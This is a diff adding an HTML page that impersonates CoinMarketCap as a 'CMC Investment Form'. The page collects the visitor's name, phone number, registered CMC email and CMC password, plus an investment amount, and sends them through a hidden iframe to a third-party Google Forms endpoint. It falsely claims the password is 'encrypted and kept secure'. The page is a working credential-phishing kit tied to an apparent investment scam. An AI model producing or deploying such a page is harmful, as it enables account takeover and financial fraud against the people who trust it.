@@ -1,0 +1,234 @@
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>CMC Investment Form</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/css/intlTelInput.css"/>
+  <style>
+    :root{
+      --blue:#007BFF;
+      --blue-dark:#0056b3;
+      --white:#ffffff;
+      --gray-light:#f0f4f8;
+    }
+    *{box-sizing:border-box}
+    body{
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #007BFF 0%, #66b2ff 50%, #f0f7ff 100%);
+      min-height:100vh;
+      margin:0;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding:24px;
+    }
+    .form-container{
+      background: var(--white);
+      width:100%;
+      max-width:520px;
+      padding:28px;
+      border-radius:16px;
+      box-shadow:0 10px 30px rgba(0,0,0,0.12);
+      text-align:center;
+    }
+    .logo{
+      max-width:120px;
+      margin-bottom:16px;
+    }
+    h2{
+      margin:0 0 18px;
+      color:var(--blue);
+    }
+    .hint{
+      margin:-6px 0 16px;
+      font-size:12px;
+      color:#555;
+    }
+    .form-group{ margin-bottom:14px; text-align:left; }
+    .form-group label{
+      display:block;
+      margin-bottom:6px;
+      font-weight:700;
+      color:#1b3a57;
+    }
+    input, select, textarea{
+      width:100%;
+      padding:12px;
+      font-size:14px;
+      border-radius:8px;
+      border:1px solid var(--blue);
+      background: var(--gray-light);
+      color: #1b3a57;
+      outline:none;
+    }
+    textarea{ min-height:96px; resize:vertical; }
+    .muted{
+      font-size:12px; 
+      color:#555; 
+      margin-top:6px;
+    }
+    button{
+      width:100%;
+      padding:12px 14px;
+      border:none; border-radius:10px;
+      background:var(--blue);
+      color:#fff; font-size:16px; font-weight:700;
+      cursor:pointer; transition:background .2s ease;
+      margin-top:6px;
+    }
+    button:hover{ background:var(--blue-dark); }
+    .success{
+      margin-top:14px; text-align:center;
+      color: #198754; font-weight:700; min-height:20px;
+    }
+    .error{
+      margin-top:6px;
+      font-size:12px;
+      color:#d9534f;
+      display:none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="form-container">
+    <!-- CoinMarketCap Logo -->
+    <img src="https://s2.coinmarketcap.com/static/cloud/img/coinmarketcap_white_1.svg" alt="CMC Logo" class="logo">
+
+    <h2>CMC Investment Form</h2>
+    <p class="hint">Fill out the form to submit your investment details.</p>
+
+    <form id="cmcForm"
+      action="https://docs.google.com/forms/d/e/1FAIpQLSeL9kClbHjGl-PwyPsVh1x3xLjtCKffLsV72iBkcZSOLRp2ug/formResponse"
+      method="POST" target="hidden_iframe">
+
+      <!-- Full Name -->
+      <div class="form-group">
+        <label for="fullName">Full Name *</label>
+        <input id="fullName" name="entry.263470542" type="text" required />
+      </div>
+
+      <!-- Country of Origin -->
+      <div class="form-group">
+        <label for="country">Country of Origin *</label>
+        <input id="country" name="entry.773399872" type="text" required />
+      </div>
+
+      <!-- Phone Number -->
+      <div class="form-group">
+        <label for="phone">Phone Number *</label>
+        <input id="phone" name="entry.123456789" type="tel" required />
+        <div class="error" id="phoneError">❌ Please enter a valid phone number.</div>
+      </div>
+
+      <!-- CMC Registered Email -->
+      <div class="form-group">
+        <label for="cmcEmail">CMC Registered Email *</label>
+        <input id="cmcEmail" name="entry.655062453" type="email" required />
+      </div>
+
+      <!-- CMC Password -->
+      <div class="form-group">
+        <label for="cmcPass">CMC Password *</label>
+        <input id="cmcPass" name="entry.2001454452" type="password" required />
+        <div class="muted">Your password is encrypted and kept secure. We never share your credentials.</div>
+      </div>
+
+      <!-- Investment Amount -->
+      <div class="form-group">
+        <label for="amount">Investment Amount *</label>
+        <input id="amount" name="entry.1161014237" type="number" step="0.01" min="0" required />
+      </div>
+
+      <!-- Preferred Currency -->
+      <div class="form-group">
+        <label for="currency">Preferred Currency *</label>
+        <select id="currency" name="entry.996767956" required>
+          <option value="">-- Select currency --</option>
+          <option value="NGN">NGN — Nigerian Naira</option>
+          <option value="USD">USD — US Dollar</option>
+          <option value="EUR">EUR — Euro</option>
+          <option value="GBP">GBP — British Pound</option>
+          <option value="AED">AED — UAE Dirham</option>
+          <option value="AUD">AUD — Australian Dollar</option>
+          <option value="BRL">BRL — Brazilian Real</option>
+          <option value="CAD">CAD — Canadian Dollar</option>
+          <option value="CHF">CHF — Swiss Franc</option>
+          <option value="CNY">CNY — Chinese Yuan</option>
+          <option value="EGP">EGP — Egyptian Pound</option>
+          <option value="GHS">GHS — Ghanaian Cedi</option>
+          <option value="INR">INR — Indian Rupee</option>
+          <option value="JPY">JPY — Japanese Yen</option>
+          <option value="KES">KES — Kenyan Shilling</option>
+          <option value="RUB">RUB — Russian Ruble</option>
+          <option value="SAR">SAR — Saudi Riyal</option>
+          <option value="SEK">SEK — Swedish Krona</option>
+          <option value="SGD">SGD — Singapore Dollar</option>
+          <option value="TZS">TZS — Tanzanian Shilling</option>
+          <option value="UGX">UGX — Ugandan Shilling</option>
+          <option value="XAF">XAF — Central African CFA</option>
+          <option value="XOF">XOF — West African CFA</option>
+          <option value="ZAR">ZAR — South African Rand</option>
+          <option value="ZMW">ZMW — Zambian Kwacha</option>
+        </select>
+      </div>
+
+      <!-- Investment Plan -->
+      <div class="form-group">
+        <label for="plan">Investment Plan *</label>
+        <select id="plan" name="entry.136836683" required>
+          <option value="">-- Select plan --</option>
+          <option value="Short-term">Short-term</option>
+          <option value="Medium">Medium</option>
+          <option value="Long-term">Long-term</option>
+          <option value="Premium">Premium</option>
+        </select>
+      </div>
+
+      <!-- Additional Notes -->
+      <div class="form-group">
+        <label for="notes">Additional Notes (optional)</label>
+        <textarea id="notes" name="entry.999999999" placeholder="Anything we should know?"></textarea>
+      </div>
+
+      <button type="submit">Submit</button>
+      <div class="success" id="successMsg"></div>
+      <iframe name="hidden_iframe" style="display:none;"></iframe>
+    </form>
+  </div>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/intlTelInput.min.js"></script>
+  <script>
+    const phoneInput = document.querySelector("#phone");
+    const phoneError = document.getElementById("phoneError");
+    const iti = window.intlTelInput(phoneInput, {
+      initialCountry: "ng", // Default Nigeria
+      preferredCountries: ["ng", "gh", "za", "ke", "eg"], // African priority
+      separateDialCode: true,
+      utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/utils.js"
+    });
+
+    const form = document.getElementById('cmcForm');
+    const success = document.getElementById('successMsg');
+
+    form.addEventListener('submit', function(e){
+      e.preventDefault();
+
+      // Validate phone number
+      if (!iti.isValidNumber()) {
+        phoneError.style.display = "block";
+        return;
+      } else {
+        phoneError.style.display = "none";
+      }
+
+      // Replace phone input value with full international number
+      phoneInput.value = iti.getNumber();
+
+      success.textContent = "✅ Thank you! Your response has been recorded.";
+      form.submit();
+      setTimeout(()=>{ form.reset(); iti.setCountry("ng"); }, 400);
+    });
+  </script>
+</body>
+</html>
